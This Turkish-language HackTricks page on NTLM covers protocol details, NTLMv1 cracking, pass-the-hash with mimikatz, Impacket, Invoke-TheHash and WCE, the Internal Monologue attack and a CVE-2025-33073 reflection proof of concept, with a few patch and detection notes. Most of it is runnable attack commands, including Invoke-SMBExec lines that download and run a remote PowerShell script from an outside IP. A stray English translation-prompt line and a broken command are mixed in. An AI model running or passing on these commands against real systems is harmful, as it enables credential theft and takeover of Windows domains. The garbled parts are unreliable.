# NTLM

{{#include ../../banners/hacktricks-training.md}}


## Temel Bilgiler

**Windows XP ve Server 2003** kullanılan ortamlarda LM (Lan Manager) hash'leri kullanılır; ancak bunların kolayca compromise edilebildiği yaygın olarak bilinmektedir. Belirli bir LM hash'i olan `AAD3B435B51404EEAAD3B435B51404EE`, LM'in kullanılmadığını gösterir ve boş bir string'in hash'ini temsil eder.

Varsayılan olarak **Kerberos** authentication protocol'ü birincil yöntemdir. NTLM (NT LAN Manager) belirli durumlarda devreye girer: Active Directory'nin bulunmaması, domain'in mevcut olmaması, hatalı yapılandırma nedeniyle Kerberos'un çalışmaması veya bağlantıların geçerli bir hostname yerine bir IP address kullanılarak denenmesi.

Network packet'lerinde **"NTLMSSP"** header'ının bulunması, bir NTLM authentication process'ini gösterir.

Authentication protocol'leri olan LM, NTLMv1 ve NTLMv2 için support, `%windir%\Windows\System32\msv1\_0.dll` konumunda bulunan belirli bir DLL tarafından sağlanır.

**Önemli Noktalar**:

- LM hash'leri vulnerable'dır ve boş bir LM hash'i (`AAD3B435B51404EEAAD3B435B51404EE`) bunun kullanılmadığını gösterir.
- Kerberos varsayılan authentication method'udur; NTLM yalnızca belirli koşullarda kullanılır.
- NTLM authentication packet'leri, "NTLMSSP" header'ı ile tanımlanabilir.
- LM, NTLMv1 ve NTLMv2 protocol'leri `msv1\_0.dll` system file'ı tarafından desteklenir.

## LM, NTLMv1 ve NTLMv2

Hangi protocol'ün kullanılacağını kontrol edebilir ve yapılandırabilirsiniz:

### GUI

_**secpol.msc**_ -> Local policies -> Security Options -> Network Security: LAN Manager authentication level'i çalıştırın. 0 ile 5 arasında 6 level bulunur.

![LM, NTLMv1 ve NTLMv2 - GUI: **secpol.msc**'yi çalıştırın - Local policies - Security Options - Network Security: LAN Manager authentication level. 0 ile 5 arasında 6 level bulunur](<../../images/image (919).png>)

### Registry

Bu işlem level'i 5 olarak ayarlar:
```
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa\ /v lmcompatibilitylevel /t REG_DWORD /d 5 /f
```
Olası değerler:
```
0 - Send LM & NTLM responses
1 - Send LM & NTLM responses, use NTLMv2 session security if negotiated
2 - Send NTLM response only
3 - Send NTLMv2 response only
4 - Send NTLMv2 response only, refuse LM
5 - Send NTLMv2 response only, refuse LM & NTLM
```
## Temel NTLM Domain kimlik doğrulama şeması

1. **Kullanıcı**, **kimlik bilgilerini** girer
2. İstemci makine **domain adını** ve **kullanıcı adını** göndererek bir **authentication request** gönderir
3. **Sunucu**, **challenge** gönderir
4. **İstemci**, anahtar olarak parolanın hash'ini kullanarak **challenge** değerini **encrypt eder** ve yanıt olarak gönderir
5. **Sunucu**, **domain adını, kullanıcı adını, challenge değerini ve yanıtı** **Domain Controller**'a gönderir. Yapılandırılmış bir **Active Directory** yoksa veya domain adı sunucunun adıysa, kimlik bilgileri **yerel olarak kontrol edilir**.
6. **Domain Controller**, her şeyin doğru olup olmadığını kontrol eder ve bilgileri sunucuya gönderir

**Sunucu** ve **Domain Controller**, **Netlogon** sunucusu aracılığıyla bir **Secure Channel** oluşturabilir; çünkü Domain Controller sunucunun parolasını bilir (bu parola **NTDS.DIT** db'sinin içindedir).

### Yerel NTLM kimlik doğrulama şeması

Kimlik doğrulama, yukarıda belirtilenle aynıdır; **ancak** **sunucu**, **SAM** dosyasında kimlik doğrulamaya çalışan **kullanıcının hash'ini** bilir. Bu nedenle **Domain Controller**'a sormak yerine **sunucu**, kullanıcının kimlik doğrulaması yapıp yapamayacağını **kendi başına kontrol eder**.

### NTLMv1 Challenge

**Challenge uzunluğu 8 byte'tır** ve **yanıtın** uzunluğu **24 byte**'tır.

**NT hash (16 byte)**, **3 adet 7 byte'lık parçaya** bölünür (7B + 7B + (2B+0x00\*5)): **son parça sıfırlarla doldurulur**. Ardından **challenge**, her parçayla ayrı ayrı **cipher edilir** ve elde edilen **cipher edilmiş byte'lar birleştirilir**. Toplam: 8B + 8B + 8B = 24Byte.

**Sorunlar**:

- **Randomness eksikliği**
- NT hash'i bulmak için 3 parça ayrı ayrı **attack edilebilir**
- **DES crack edilebilir**
- 3. anahtar her zaman **5 sıfırdan** oluşur.
- Aynı **challenge** verildiğinde **yanıt** aynı olacaktır. Bu nedenle kurbana **challenge** olarak "**1122334455667788**" dizesini verebilir ve kullanılan yanıtı **precomputed rainbow tables** ile attack edebilirsiniz.

### NTLMv1 attack

Günümüzde **Unconstrained Delegation** yapılandırılmış ortamlarla karşılaşmak daha az yaygın hale geliyor; ancak bu, yapılandırılmış bir **Print Spooler** servisini **abuse edemeyeceğiniz** anlamına gelmez.

AD üzerinde zaten sahip olduğunuz bazı kimlik bilgilerini/oturumları abuse ederek **yazıcıdan**, kontrolünüz altındaki bir **host**'a karşı **authenticate olmasını** isteyebilirsiniz. Ardından `metasploit auxiliary/server/capture/smb` veya `responder` kullanarak **authentication challenge'ını 1122334455667788 olarak ayarlayabilir**, authentication girişimini yakalayabilir ve işlem **NTLMv1** kullanılarak yapıldıysa **crack edebilirsiniz**.\
`responder` kullanıyorsanız **authentication'ı downgrade etmeyi** denemek için **`--lm` flag'ini kullanmayı** deneyebilirsiniz.\
_Bu teknik için authentication'ın NTLMv1 kullanılarak gerçekleştirilmesi gerektiğini unutmayın (NTLMv2 geçerli değildir)._

Yazıcının authentication sırasında bilgisayar hesabını kullanacağını unutmayın; bilgisayar hesapları **uzun ve random parolalar** kullanır ve bunları yaygın **dictionary'ler** kullanarak **crack edememeniz** olasıdır. Ancak **NTLMv1** authentication'ı **DES** kullanır ([more info here](#ntlmv1-challenge)); bu nedenle özellikle DES cracking için ayrılmış bazı servisleri kullanarak bunu crack edebilirsiniz (örneğin [https://crack.sh/](https://crack.sh) veya [https://ntlmv1.com/](https://ntlmv1.com) kullanılabilir).

### NTLMv1 attack with hashcat

NTLMv1, NTLMv1 mesajlarını hashcat ile kırılabilecekleri bir yöntemle biçimlendiren NTLMv1 Multi Tool [https://github.com/evilmog/ntlmv1-multi](https://github.com/evilmog/ntlmv1-multi) ile de kırılabilir.<sup>[[1]](#references)</sup>

Komut
```bash
python3 ntlmv1.py --ntlmv1 hashcat::DUSTIN-5AA37877:76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D:727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595:1122334455667788
```
aşağıdakini çıktı olarak verirdi:
```bash
['hashcat', '', 'DUSTIN-5AA37877', '76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D', '727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595', '1122334455667788']

Hostname: DUSTIN-5AA37877
Username: hashcat
Challenge: 1122334455667788
LM Response: 76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D
NT Response: 727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595
CT1: 727B4E35F947129E
CT2: A52B9CDEDAE86934
CT3: BB23EF89F50FC595

To Calculate final 4 characters of NTLM hash use:
./ct3_to_ntlm.bin BB23EF89F50FC595 1122334455667788

To crack with hashcat create a file with the following contents:
727B4E35F947129E:1122334455667788
A52B9CDEDAE86934:1122334455667788

To crack with hashcat:
./hashcat -m 14000 -a 3 -1 charsets/DES_full.charset --hex-charset hashes.txt ?1?1?1?1?1?1?1?1

To Crack with crack.sh use the following token
NTHASH:727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595
```
Şu içeriğe sahip bir dosya oluşturun:
```bash
727B4E35F947129E:1122334455667788
A52B9CDEDAE86934:1122334455667788
```
hashcat'i çalıştırın (dağıtım için hashtopolis gibi bir tool kullanmak en iyisidir); aksi takdirde bu işlem birkaç gün sürer.
```bash
./hashcat -m 14000 -a 3 -1 charsets/DES_full.charset --hex-charset hashes.txt ?1?1?1?1?1?1?1?1
```
Bu durumda parolayı biliyoruz; parola password, bu nedenle demo amaçlarıyla hile yapacağız:
```bash
python ntlm-to-des.py --ntlm b4b9b02e6f09a9bd760f388b67351e2b
DESKEY1: b55d6d04e67926
DESKEY2: bcba83e6895b9d

echo b55d6d04e67926>>des.cand
echo bcba83e6895b9d>>des.cand
```
Şimdi kırılmış des anahtarlarını NTLM hash'inin parçalarına dönüştürmek için hashcat-utilities kullanmamız gerekiyor:
```bash
./hashcat-utils/src/deskey_to_ntlm.pl b55d6d05e7792753
b4b9b02e6f09a9 # this is part 1

./hashcat-utils/src/deskey_to_ntlm.pl bcba83e6895b9d
bd760f388b6700 # this is part 2
```
Son olarak son kısım:
```bash
./hashcat-utils/src/ct3_to_ntlm.bin BB23EF89F50FC595 1122334455667788

586c # this is the last part
```
Please provide the texts you want me to combine and translate.
```bash
NTHASH=b4b9b02e6f09a9bd760f388b6700586c
```
### NTLMv2 Challenge

**challenge length 8 byte'tır** ve **2 response gönderilir**: Bunlardan biri **24 byte** uzunluğundadır, diğerinin uzunluğu ise **değişkendir**.

**İlk response**, **client ve domain'den** oluşan **string'in**, **key** olarak **NT hash'in MD4 hash'i** kullanılarak **HMAC_MD5** ile cipher edilmesiyle oluşturulur. Ardından **result**, **challenge'ı** HMAC_MD5 kullanarak cipher etmek için **key** olarak kullanılır. Buna 8 byte uzunluğunda bir **client challenge** eklenir. Toplam: 24 B.

**İkinci response**, birkaç değer kullanılarak oluşturulur (yeni bir client challenge, **replay attacks**'i önlemek için bir **timestamp**...)

**Başarılı bir authentication process'i yakalamış bir pcap'iniz varsa**, domain'i, username'i, challenge'ı ve response'u elde etmek ve password'ü crack etmeyi denemek için şu guide'ı takip edebilirsiniz: [https://research.801labs.org/cracking-an-ntlmv2-hash/](https://www.801labs.org/research-portal/post/cracking-an-ntlmv2-hash/)<sup>[[2]](#references)</sup>

## Pass-the-Hash

**Victim'in hash'ine sahip olduğunuzda**, onu **impersonate** etmek için kullanabilirsiniz.\
Bu **hash'i kullanarak NTLM authentication gerçekleştirecek** bir **tool** kullanmanız gerekir; **veya** yeni bir **sessionlogon** oluşturup bu **hash'i** **LSASS** içine **inject** edebilirsiniz. Böylece herhangi bir **NTLM authentication gerçekleştirildiğinde**, **bu hash kullanılır.** Son seçenek, mimikatz'ın yaptığı şeydir.

**Pass-the-Hash attacks'leri Computer accounts kullanarak da gerçekleştirebileceğinizi lütfen unutmayın.**

### **Mimikatz**

**Administrator olarak çalıştırılması gerekir**
```bash
Invoke-Mimikatz -Command '"sekurlsa::pth /user:username /domain:domain.tld /ntlm:NTLMhash /run:powershell.exe"'
```
Bu işlem, mimikatz'ı başlatan kullanıcılara ait olacak bir process başlatır; ancak LSASS içinde kaydedilen credentials, mimikatz parametrelerinde bulunanlardır. Ardından, plain-text password'ü bilmenize gerek kalmadan network resources'lara o kullanıcıymışsınız gibi erişebilirsiniz (`runas /netonly` trick'ine benzer).

### Linux'tan Pass-the-Hash

Linux kullanarak Pass-the-Hash ile Windows makinelerinde code execution elde edebilirsiniz.\
[**Bunu nasıl yapacağınızı öğrenmek için buradan erişin.**](https://github.com/carlospolop/hacktricks/blob/master/windows/ntlm/broken-reference/README.md)

### Impacket Windows compiled tools

[ Impacket binaries for Windows'ı buradan indirebilirsiniz](https://github.com/ropnop/impacket_static_binaries/releases/tag/0.9.21-dev-binaries).

- **psexec_windows.exe** `C:\AD\MyTools\psexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.my.domain.local`
- **wmiexec.exe** `wmiexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.dollarcorp.moneycorp.local`
- **atexec.exe** (Bu durumda bir command belirtmeniz gerekir; cmd.exe ve powershell.exe, interactive shell elde etmek için geçerli değildir)`C:\AD\MyTools\atexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.dollarcorp.moneycorp.local 'whoami'`
- Daha birçok Impacket binary'si vardır...

### Invoke-TheHash

Powershell script'lerini buradan alabilirsiniz: [https://github.com/Kevin-Robertson/Invoke-TheHash](https://github.com/Kevin-Robertson/Invoke-TheHash)<sup>[[3]](#references)</sup>

#### Invoke-SMBExec
```bash
Invoke-SMBExec -Target dcorp-mgmt.my.domain.local -Domain my.domain.local -Username username -Hash b38ff50264b74508085d82c69794a4d8 -Command 'powershell -ep bypass -Command "iex(iwr http://172.16.100.114:8080/pc.ps1 -UseBasicParsing)"' -verbose
```
#### Invoke-WMIExec
```bash
Invoke-SMBExec -Target dcorp-mgmt.my.domain.local -Domain my.domain.local -Username username -Hash b38ff50264b74508085d82c69794a4d8 -Command 'powershell -ep bypass -Command "iex(iwr http://172.16.100.114:8080/pc.ps1 -UseBasicParsing)"' -verbose
```
#### Invoke-SMBClient
```bash
Invoke-SMBClient -Domain dollarcorp.moneycorp.local -Username svcadmin -Hash b38ff50264b74508085d82c69794a4d8 [-Action Recurse] -Source \\dcorp-mgmt.my.domain.local\C$\ -verbose
```
#### Invoke-SMBEnum
```bash
Invoke-SMBEnum -Domain dollarcorp.moneycorp.local -Username svcadmin -Hash b38ff50264b74508085d82c69794a4d8 -Target dcorp-mgmt.dollarcorp.moneycorp.local -verbose
```
#### Invoke-TheHash

Bu function **diğerlerinin tamamının bir karışımıdır**. **Birden fazla host** geçebilir, bazılarını **hariç tutabilir** ve kullanmak istediğiniz **option**'ı (_SMBExec, WMIExec, SMBClient, SMBEnum_) **seçebilirsiniz**. **SMBExec** veya **WMIExec**'ten **herhangi birini** seçer ancak herhangi bir _**Command**_ parametresi **vermezseniz**, yalnızca **yeterli izinlere** sahip olup olmadığınızı **kontrol eder**.
```
Invoke-TheHash -Type WMIExec -Target 192.168.100.0/24 -TargetExclude 192.168.100.50 -Username Administ -ty    h F6F38B793DB6A94BA04A52F1D3EE92F0
```
### [Evil-WinRM Pass the Hash](../../network-services-pentesting/5985-5986-pentesting-winrm.md#using-evil-winrm)

### Windows Credentials Editor (WCE)

**Yönetici olarak çalıştırılmalıdır**

Bu tool, mimikatz ile aynı işlemi yapar (LSASS belleğini değiştirir).
```
wce.exe -s <username>:<domain>:<hash_lm>:<hash_nt>
```
### Kullanıcı adı ve parola ile manuel Windows remote execution


{{#ref}}
../lateral-movement/
{{#endref}}

## Windows Host'tan kimlik bilgilerini çıkarma

**Windows host'tan kimlik bilgilerinin nasıl elde edileceği hakkında daha fazla bilgi için** [**bu sayfayı okumalısınız**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/ntlm/broken-reference/README.md)**.**

## Internal Monologue attack

Internal Monologue Attack, bir saldırganın **LSASS process'iyle doğrudan etkileşime girmeden** kurban makinesinden NTLM hash'lerini almasını sağlayan gizli bir credential extraction tekniğidir. Hash'leri doğrudan memory'den okuyan ve endpoint security solutions veya Credential Guard tarafından sıklıkla engellenen Mimikatz'ın aksine bu attack, **Security Support Provider Interface (SSPI) üzerinden NTLM authentication package'a (MSV1_0) yapılan local calls** yönteminden yararlanır. Saldırgan önce **NTLM settings'lerini** (ör. LMCompatibilityLevel, NTLMMinClientSec, RestrictSendingNTLMTraffic) **downgrade ederek** NetNTLMv1'e izin verildiğinden emin olur. Ardından running processes'ten elde edilen mevcut user token'larını impersonate eder ve bilinen bir challenge kullanarak NetNTLMv1 responses üretmek için local olarak NTLM authentication'ı tetikler.<sup>[[4]](#references)</sup>

Bu NetNTLMv1 responses yakalandıktan sonra saldırgan, **precomputed rainbow tables** kullanarak orijinal NTLM hash'lerini hızlıca kurtarabilir ve lateral movement için daha ileri Pass-the-Hash attacks gerçekleştirebilir. Önemli olarak Internal Monologue Attack; network traffic üretmediği, code inject etmediği veya doğrudan memory dumps tetiklemediği için gizliliğini korur ve Mimikatz gibi traditional methods'e kıyasla defender'ların bunu tespit etmesini zorlaştırır.

Enforced security policies nedeniyle NetNTLMv1 kabul edilmezse saldırgan bir NetNTLMv1 response elde edemeyebilir.

Bu durumu ele almak için Internal Monologue tool güncellendi: NetNTLMv1 başarısız olursa bile **NetNTLMv2 responses yakalamaya** devam etmek için `AcceptSecurityContext()` kullanarak dinamik olarak bir server token elde eder. NetNTLMv2'yi crack etmek çok daha zor olsa da sınırlı durumlarda relay attacks veya offline brute-force için hâlâ bir yol açar.

PoC şu adreste bulunabilir: **[https://github.com/eladshamir/Internal-Monologue](https://github.com/eladshamir/Internal-Monologue)**.

## NTLM Relay and Responder

**Bu attacks'lerin nasıl gerçekleştirileceğine dair daha ayrıntılı guide'ı buradan okuyun:**


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

## Bir network capture'dan NTLM challenges'larını parse etme

**Şunu kullanabilirsiniz:** [**https://github.com/mlgualtieri/NTLMRawUnHide**](https://github.com/mlgualtieri/NTLMRawUnHide)

## Serialized SPNs üzerinden NTLM & Kerberos *Reflection* (CVE-2025-33073)

Windows, bir host'tan kaynaklanan NTLM (veya Kerberos) authentication'ın SYSTEM privileges elde etmek için **aynı** host'a geri relay edildiği *reflection* attacks'lerini engellemeye çalışan çeşitli mitigations içerir.

Microsoft, MS08-068 (SMB→SMB), MS09-013 (HTTP→SMB), MS15-076 (DCOM→DCOM) ve sonraki patches ile public chains'lerin çoğunu engelledi; ancak **CVE-2025-33073**, **SMB client'ın *marshalled* (serialized) target-info içeren Service Principal Names'leri (SPNs) truncate etmesinden** yararlanılarak protections'ların hâlâ bypass edilebildiğini gösterir.<sup>[[5]](#references)[[6]](#references)</sup>

### Bug'ın TL;DR'si
1. Saldırgan, marshalled bir SPN'i encode eden bir **DNS A-record** kaydeder – ör.
`srv11UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA → 10.10.10.50`
2. Kurban, bu hostname'e authenticate olmaya zorlanır (PetitPotam, DFSCoerce vb.).
3. SMB client target string `cifs/srv11UWhRCAAAAA…` değerini `lsasrv!LsapCheckMarshalledTargetInfo`'ya ilettiğinde, `CredUnmarshalTargetInfo` çağrısı **serialized blob'u kaldırır** ve geriye **`cifs/srv1`** bırakır.
4. `msv1_0!SspIsTargetLocalhost` (veya Kerberos equivalent'i), short host part computer name (`SRV1`) ile eşleştiği için target'ı artık *localhost* olarak değerlendirir.
5. Sonuç olarak server, `NTLMSSP_NEGOTIATE_LOCAL_CALL` ayarını yapar ve **LSASS' SYSTEM access-token'ını** context'e inject eder (Kerberos için SYSTEM-marked bir subsession key oluşturulur).
6. Bu authentication'ı `ntlmrelayx.py` **veya** `krbrelayx.py` ile relay etmek, aynı host üzerinde full SYSTEM rights sağlar.<sup>[[5]](#references)</sup>

### Quick PoC
```bash
# Add malicious DNS record
dnstool.py -u 'DOMAIN\\user' -p 'pass' 10.10.10.1 \
-a add -r srv11UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA \
-d 10.10.10.50

# Trigger authentication
PetitPotam.py -u user -p pass -d DOMAIN \
srv11UWhRCAAAAAAAAAAAAAAAAA… TARGET.DOMAIN.LOCAL

# Relay listener (NTLM)
ntlmrelayx.py -t TARGET.DOMAIN.LOCAL -smb2support

# Relay listener (Kerberos) – remove NTLM mechType first
krbrelayx.py -t TARGET.DOMAIN.LOCAL -smb2support
```
### Yama ve Önlemler
* **CVE-2025-33073** için KB yaması, `mrxsmb.sys::SmbCeCreateSrvCall` içine, hedefi marshalled bilgi içeren herhangi bir SMB bağlantısını (`CredUnmarshalTargetInfo` ≠ `STATUS_INVALID_PARAMETER`) engelleyen bir kontrol ekler.<sup>[[5]](#references)[[6]](#references)</sup>
* Yamalanmamış hostlarda bile reflection saldırılarını önlemek için **SMB signing** uygulayın.
* `*<base64>...*` biçimine benzeyen DNS kayıtlarını izleyin ve coercion vektörlerini (PetitPotam, DFSCoerce, AuthIP...) engelleyin.

### Tespit fikirleri
* İstemci IP'sinin sunucu IP'sinden farklı olduğu `NTLMSSP_NEGOTIATE_LOCAL_CALL` içeren ağ yakalamaları.
* Bir subsession key ve hostname'e eşit bir client principal içeren Kerberos AP-REQ.
* Aynı hosttan gerçekleştirilen uzak SMB yazma işlemlerinin hemen ardından gelen Windows Event 4624/4648 SYSTEM logon'ları.<sup>[[5]](#references)</sup>

`NT AUTHORITY\SYSTEM`'a ulaşmak için **SMB arbitrary ports** ve **TCP connection reuse** kullanan **Mart 2026** tarihli local reflection varyantı için bkz.:

{{#ref}}
../windows-local-privilege-escalation/local-ntlm-reflection-via-smb-arbitrary-port.md
{{#endref}}

## Referanslar
- [1] [evilmog/ntlmv1-multi – NTLMv1 Multitool](https://github.com/evilmog/ntlmv1-multi)
- [2] [NTLMv2 Hash'ini Cracking](https://www.801labs.org/research-portal/post/cracking-an-ntlmv2-hash/)
- [3] [Kevin-Robertson/Invoke-TheHash – PowerShell Pass The Hash Utilities](https://github.com/Kevin-Robertson/Invoke-TheHash)
- [4] [Internal Monologue Attack: LSASS'e Dokunmadan NTLM Hash'lerini Alma](https://github.com/eladshamir/Internal-Monologue)
- [5] [NTLM Reflection Öldü, Yaşasın NTLM Reflection!](https://www.synacktiv.com/en/publications/la-reflexion-ntlm-est-morte-vive-la-reflexion-ntlm-analyse-approfondie-de-la-cve-2025.html)
- [6] [MSRC – CVE-2025-33073](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-33073)

{{#include ../../banners/hacktricks-training.md}}
